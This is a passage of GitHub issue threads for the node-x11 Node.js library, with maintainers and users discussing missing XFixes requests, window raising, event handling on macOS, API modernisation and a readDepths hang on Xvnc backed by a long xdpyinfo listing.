    <Comment>
      <Owner>TriplexRoss</Owner>
      <Body>Just load the extension and call `FixesGetCursorImage` from the object you get.</Body>
    </Comment>
    <Comment>
      <Owner>voxsoftware</Owner>
      <Body>message: "fixes.FixesGetCursorImage is not a function"&#13;
&#13;
the problem is that I don't see that method in ext/fixes extension. Any other way for implementing get the cursor image data?</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Looks like it's missing. Do you want to try to add implementation?&#13;
&#13;
Response structure from https://www.x.org/releases/X11R7.7/doc/fixesproto/fixesproto.txt&#13;
```&#13;
&#13;
GetCursorImage&#13;
&#13;
  -&gt;&#13;
&#13;
  x:   INT16&#13;
  y:   INT16&#13;
  width:   CARD16&#13;
  height:   CARD16&#13;
  x-hot:   CARD16&#13;
  y-hot:   CARD16&#13;
  cursor-serial:  CARD32&#13;
  cursor-image:  LISTofCARD32&#13;
&#13;
 GetCursorImage returns the image of the current cursor.  X and y are&#13;
 the current cursor position.  Width and height are the size of the&#13;
 cursor image.  X-hot and y-hot mark the hotspot within the cursor&#13;
 image.  Cursor-serial provides the number assigned to this cursor&#13;
 image, this same serial number will be reported in a CursorNotify&#13;
 event if this cursor image is redisplayed in the future.&#13;
&#13;
 The cursor image itself is returned as a single image at 32 bits per&#13;
 pixel with 8 bits of alpha in the most significant 8 bits of the&#13;
 pixel followed by 8 bits each of red, green and finally 8 bits of&#13;
 blue in the least significant 8 bits.  The color components are&#13;
 pre-multiplied with the alpha component.&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>looks like opcode is 4 ( I hate that opcodes not included in protocol docs )&#13;
&#13;
https://github.com/zwcloud/XcbSharp/blob/7d012ec64a2f5e6207da708d70856466ab35e173/xfixes.xml#L125</Body>
    </Comment>
  </Issue_541>
  <Issue_542>
    <Repository>node-x11</Repository>
    <Title>RaiseWindow doesn't raise a window</Title>
    <Owner>sidorares</Owner>
    <Body>In RDE Panel's source code the `windows` item type runs `this.panel.app.getXClient().RaiseWindow(window.id);` when you left click on a window title that's rendered but the window doesn't get raised. I've already checked that the function is being called because there's a `console.log` before it.</Body>
    <State>open</State>
    <Comment>
      <Owner>santigimeno</Owner>
      <Body>This one is tricky. I guess it depends on the `WM` it's running on the system. To accomplish this what I would usually do is use some tools like `wmctrl` or `xdotool` and see which command would work for me. Then would call the command with `xtrace` to find out what `x11` requests use. For example to set a window on top of everything I would use this sequence:&#13;
&#13;
1 - Add the `_NET_WM_STATE_ABOVE` value to the `_NET_WM_STATE` property.&#13;
2 - One you know is set, send a `_NET_ACTIVE_WINDOW` client message to request the `WM` to set the focus on the window.</Body>
    </Comment>
  </Issue_542>
  <Issue_543>
    <Repository>node-x11</Repository>
    <Title>Using ES6 features (eg classes)</Title>
    <Owner>sidorares</Owner>
    <Body>Currently node-x11 is using old idioms for inheritance, which I think is unnecessary at this point. Node has _long_ supported most of ES6, and the same applies to virtually every other browser (if portability is even a concern). Using these features will enhance code readability, reduce potential errors introduced through boilerplate, and eliminate the need for certain utilities like `util.inherits`. I also see a lot of comments questioning the speed of certain utility hacks, many of which have dedicated ES6 functions.&#13;
&#13;
I'd be glad to make these changes myself, starting with the least intrusive feature, classes (which are indistinguishable from the old idioms), and going on with updating the content with ES6 idioms.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Personally I don't see that very high on my priority list.&#13;
re code readability - I really want to reformat all code and add prettier + eslint as part of automatic code check / transformation ( see https://github.com/sidorares/dbus-native/pull/172 for example of similar work )&#13;
&#13;
Performance wise I think we can get huge benefit by switching from string based parser to binary Buffers ( it was created initially before Buffer existed at all in node back in 2010 )</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>But in general happy to gradually move to new language features - it's safe to require 4.x as minimum node version, thanks for the offer @ConsciousCode </Body>
    </Comment>
  </Issue_543>
  <Issue_544>
    <Repository>node-x11</Repository>
    <Title>Can only use black and white colors</Title>
    <Owner>sidorares</Owner>
    <Body>Why can't I render any colors that are not black and white.&#13;
I get this error:&#13;
```&#13;
Error&#13;
    at XClient.req_proxy [as ChangeGC] (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/xcore.js:189:30)&#13;
    at RenderingContextX11.RC.setBackground (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/ntk/lib/renderingcontext_x11.js:31:17)&#13;
    at new WindowManager (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/wm/index.js:19:29)&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/index.js:6:2&#13;
    at callback (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/ntk/lib/index.js:17:17)&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/ntk/lib/index.js:56:13&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/xcore.js:590:8&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/ext/render.js:607:17&#13;
    at ReadFixedRequest.callback (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/xcore.js:545:21)&#13;
    at ReadFixedRequest.execute (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/unpackstream.js:41:10)&#13;
{ Error&#13;
    at XClient.req_proxy [as ChangeGC] (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/xcore.js:189:30)&#13;
    at RenderingContextX11.RC.setBackground (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/ntk/lib/renderingcontext_x11.js:31:17)&#13;
    at new WindowManager (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/wm/index.js:19:29)&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/index.js:6:2&#13;
    at callback (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/ntk/lib/index.js:17:17)&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/ntk/lib/index.js:56:13&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/xcore.js:590:8&#13;
    at /home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/ext/render.js:607:17&#13;
    at ReadFixedRequest.callback (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/xcore.js:545:21)&#13;
    at ReadFixedRequest.execute (/home/spaceboyross/Documents/entertaingmentOS-core/src/GUI/node_modules/x11/lib/unpackstream.js:41:10) timestamp: 1495388246048 }&#13;
&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can I look at the code? I guess it's https://github.com/Ross-Computers/entertaingmentOS-core but nothing pushed yet?&#13;
&#13;
if you are using ntk I suggest to use Render-based `2d` context instead of `x11` context ( which is based on 30+ years old  core X11 drawing api ) </Body>
    </Comment>
    <Comment>
      <Owner>TriplexRoss</Owner>
      <Body>My code is lost just now from AMD Radeon drivers failing to run</Body>
    </Comment>
  </Issue_544>
  <Issue_545>
    <Repository>node-x11</Repository>
    <Title>NOT GOING INSIDE x.on('event',</Title>
    <Owner>sidorares</Owner>
    <Body>This is the code i get from you and when i run on mac it working fine but not going in side x.on('event'
var x11 = require('x11');

```
x11.createClient(function(err, display) {
                  var X = display.client;
                  X.InternAtom(false, '_NET_WM_PID', function(err, pidAtom ) {
                               X.ChangeWindowAttributes(display.screen[0].root, { eventMask: x11.eventMask.PropertyChange });
                               X.on('event', function(ev) {
                                    if(ev.name == 'PropertyNotify') {
                                    X.GetAtomName(ev.atom, function(err, name) {
                                                  if (name == '_NET_ACTIVE_WINDOW') {
                                                  X.GetProperty(0, display.screen[0].root, ev.atom, X.atoms.WINDOW, 0, 4, function(err, prop) {
                                                                var active = prop.data.readUInt32LE(0);
                                                                X.GetProperty(0, active, pidAtom, X.atoms.CARDINAL, 0, 4, function(err, prop) {
                                                                              console.log('PID:', prop.data.readUInt32LE(0));
                                                                              });
                                                                });
                                                  }
                                                  });
                                    }
                                    });
                               });
                  });
```

![screen shot 2016-05-25 at 6 26 33 am](https://cloud.githubusercontent.com/assets/15084072/15536970/ce0636ae-2241-11e6-997b-49c921ab5df0.png)

i am not enter in step 4

![screen shot 2016-05-25 at 6 26 39 am](https://cloud.githubusercontent.com/assets/15084072/15536985/e24079ea-2241-11e6-9b7b-91be4ca64c40.png)
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Try to launch second x11 application while your script is running ( for example, type `xeyes` in terminal ) and switch focus to / from that application.
</Body>
    </Comment>
    <Comment>
      <Owner>himanshuoodles</Owner>
      <Body>Basically, what i meant to say is that the **event** ( PropertyNotify ) is not getting fired when i switch active windows.

However, it the event fires when i switch focus to / from **xeyes** . What does xeyes has to do with it?

I understood the earlier issue of not having X server but now when i have the X server, why isn't the Client responding to events from the server?

Am I missing something here?
</Body>
    </Comment>
    <Comment>
      <Owner>himanshuoodles</Owner>
      <Body>so whats the advantage of it . I am making an app which will detect active current focus window it give everything in windows but in MAC it is not working good . Is x11 is not sufficient  to use for MAC system in node webkit ? . and If it is sufficient plz tell now to do so by your plugin . 
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this depends on integration between X and cocoa ( which is not great ).
Your example is even more complicated because it involves window manager - it's separate process that is responsible for changing `_NET_ACTIVE_WINDOW` property of root window, and window manager ( in your example it's probably `opt/X11/bin/quartz-wm` ) does not care about non-X apps
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; so whats the advantage of it 

X over more "native" (in osx - [Cocoa](https://en.wikipedia.org/wiki/Cocoa_%28API%29) / [Quartz](https://en.wikipedia.org/wiki/Quartz_%28graphics_layer%29) )?

It's more portable and currently "native" for unixes. If you intend to use on osx only there is n advantage.
Also X clients are easy to connect remotely over network (from computer with potentially no real hardware display)
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this is a good introduction to what X is - http://magcius.github.io/xplain/article/
</Body>
    </Comment>
    <Comment>
      <Owner>himanshuoodles</Owner>
      <Body>nice link but @sidorares can you give me an example or docs of x11 which gives active window detail in MAC .that would we very helpful
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>x11 know nothing about osx windows. You may have some luck with AppleWM extension ( node-x11 partially [implements](https://github.com/sidorares/node-x11/blob/master/lib/ext/apple-wm.js) it )
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this prints you some events from AppleWM, but it looks that at most you'll get notifications when your x11 windows are shown:

``` js
var x11 = require('../../lib');

x11.createClient(function(err, display) {
    var X = display.client;
    X.require('apple-wm', function(err, AppleWM) {
         AppleWM.SelectInput(AppleWM.NotifyMask.All)
         X.on('event', function(ev) {
           console.log("Event", ev); //df();
         });
    });
});

```

See http://www.xfree86.org/4.6.0/AppleWM.3.html
</Body>
    </Comment>
  </Issue_545>
  <Issue_546>
    <Repository>node-x11</Repository>
    <Title>Array proto crash fix</Title>
    <Owner>sidorares</Owner>
    <Body>fixed crash when Array has some proto modifications; minor spaces fix
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi! can you provide some background - what crash you had, which Array modifications caused it etc
</Body>
    </Comment>
    <Comment>
      <Owner>vird</Owner>
      <Body>Modify examples/png/test.js such way
add before all code

```
Array.prototype.some_func = function(){};
```
</Body>
    </Comment>
  </Issue_546>
  <Issue_547>
    <Repository>node-x11</Repository>
    <Title>Add support for multi-reply handlers</Title>
    <Owner>sidorares</Owner>
    <Body>@sidorares Now it's possible to keep handlers as needed. For example, to track input events with a Record extension (e.g. EnableContext):

```
ext.EnableContext = function(ctx, cb) {
  X.seq_num++;
  X.pack_stream.pack('CCSL', [ext.majorOpcode, 5, 2, ctx]);
  X.replies[X.seq_num] = [
    handler,
    cb,
    true // multiReply
  ];
  X.pack_stream.flush();
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>so the callback decides when last packet arrives? Looks wrong to me, should be in the handler code
</Body>
    </Comment>
    <Comment>
      <Owner>aselivanov</Owner>
      <Body>Introduced `unsubscribe` callback to work with core request templates.
</Body>
    </Comment>
    <Comment>
      <Owner>aselivanov</Owner>
      <Body>Should I rename the callback to `removeHandler`?
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hey @aselivanov sorry this was silent for months.
Would like to merge this but really need to add some tests

@santigimeno maybe you could assist?
</Body>
    </Comment>
    <Comment>
      <Owner>santigimeno</Owner>
      <Body>@sidorares sure
@aselivanov yes, some tests are needed. Let me know if you need help with them
</Body>
    </Comment>
  </Issue_547>
  <Issue_548>
    <Repository>node-x11</Repository>
    <Title>return promises or thunks everywhere?</Title>
    <Owner>sidorares</Owner>
    <Body>Since generators are enabled by default in iojs and easily accessible behind flag in 0.12 it might be good to allow to yield values imagine we can have

``` js
var co   = require('co');
var x11 = require('x11');
co(function*() {
   var X = yield x11.createClient();
   var root = X.display.screen[0].root;
   var XSS = display.client.require('screen-saver');
   console.log( 'idle time: %s ', (yield XSS.QueryInfo(root)).idle );
});
```

instead of 

``` js
var x11 = require('x11');
x11.createClient(function(err, display) {
    var X = display.client;
    X.require('screen-saver', function(err, SS) {
        if (err) throw err;
        SS.QueryInfo(display.screen[0].root, function(err, info) {
           if (err) throw err; 
           console.log('Idle time', info.idle);
        });
    });
    X.on('error', console.error);
});
```

not sure if it's easy to make `co` throw correct exception with proper stack trace when there is error from request where non-error response is not sent normally ( see #85 )
</Body>
    <State>open</State>
    <Comment>
      <Owner>santigimeno</Owner>
      <Body>TBH I'm not familiar with promises at all :(. In case they were implemented, would the current API still be supported?
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Yes, current api would still be supported as we don't return anything from async function
</Body>
    </Comment>
    <Comment>
      <Owner>IonicaBizau</Owner>
      <Body>Since we can promisify any function having a callback, I'm :-1: this. Should be easy to create an `x11-promise` and keep this module as small as possible... :sparkle: 
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'm -1 here as well but probably +1 for promise ( or dual promise + callback ) in higher level api. I already started adding promises to https://github.com/sidorares/ntk so you can do `let children = await window.queryTree()`
</Body>
    </Comment>
  </Issue_548>
  <Issue_549>
    <Repository>node-x11</Repository>
    <Title>readDepths() hangs in Xvnc server</Title>
    <Owner>sidorares</Owner>
    <Body>`readDepths()` hangs if I run node-x11 with an Xvnc server.

This is happening because on this server there are two 24-bit depths. So the `Object.keys(depths).length == n_depths` test fails even after we have read all the visuals for the depths, because `depths[24]` gets overwritten. Then the next `bl.unpack()` call hangs because there is no more data to read.

I can reproduce with TigerVNC server 1.3.1 on Fedora 21 and TigerVNC server 1.1.0 on CentOS 6.6.
</Body>
    <State>open</State>
    <Comment>
      <Owner>polpo</Owner>
      <Body>Here is the output of `xdpyinfo`:

```
name of display:    :1
version number:    11.0
vendor string:    The X.Org Foundation
vendor release number:    11600000
X.Org version: 1.16.0
maximum request size:  16777212 bytes
motion buffer size:  256
bitmap unit, bit order, padding:    32, LSBFirst, 32
image byte order:    LSBFirst
number of supported pixmap formats:    6
supported pixmap formats:
    depth 1, bits_per_pixel 1, scanline_pad 32
    depth 4, bits_per_pixel 8, scanline_pad 32
    depth 8, bits_per_pixel 8, scanline_pad 32
    depth 16, bits_per_pixel 16, scanline_pad 32
    depth 24, bits_per_pixel 32, scanline_pad 32
    depth 32, bits_per_pixel 32, scanline_pad 32
keycode range:    minimum 8, maximum 255
focus:  window 0xa00022, revert to Parent
number of extensions:    25
    BIG-REQUESTS
    Composite
    DAMAGE
    DOUBLE-BUFFER
    DPMS
    DRI3
    GLX
    Generic Event Extension
    MIT-SCREEN-SAVER
    MIT-SHM
    Present
    RANDR
    RECORD
    RENDER
    SGI-GLX
    SHAPE
    SYNC
    VNC-EXTENSION
    X-Resource
    XC-MISC
    XFIXES
    XInputExtension
    XKEYBOARD
    XTEST
    XVideo
default screen number:    0
number of screens:    1

screen #0:
  dimensions:    1024x768 pixels (271x203 millimeters)
  resolution:    96x96 dots per inch
  depths (7):    1, 4, 8, 16, 24, 32, 24
  root window id:    0x178
  depth of root window:    24 planes
  number of colormaps:    minimum 1, maximum 1
  default colormap:    0x20
  default number of colormap cells:    256
  preallocated pixels:    black 0, white 16777215
  options:    backing-store WHEN MAPPED, save-unders NO
  largest cursor:    1024x768
  current input event mask:    0x70003c
    ButtonPressMask          ButtonReleaseMask        EnterWindowMask          
    LeaveWindowMask          SubstructureRedirectMask FocusChangeMask          
    PropertyChangeMask       
  number of visuals:    120
  default visual id:  0x21
  visual:
    visual id:    0x102
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x103
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x104
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x105
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x106
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x107
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x108
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x109
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x10a
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x10b
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x10c
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x10d
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x10e
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x10f
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x110
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x111
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x112
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x113
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x114
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x115
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x116
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x117
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x118
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x119
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x11a
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x11b
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x11c
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x11d
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x11e
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x11f
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x120
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x121
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x122
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x123
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x124
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x125
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x126
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x127
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x128
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x129
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x12a
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x12b
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x12c
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x12d
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x12e
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x12f
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x130
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x131
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x132
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x133
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x134
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x135
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x136
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x137
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x138
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x139
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x13a
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x13b
    class:    TrueColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x13c
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x13d
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x13e
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x13f
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x140
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x141
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x142
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x143
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x144
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x145
    class:    DirectColor
    depth:    24 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
  visual:
    visual id:    0x146
    class:    DirectColor
    depth:    24 planes
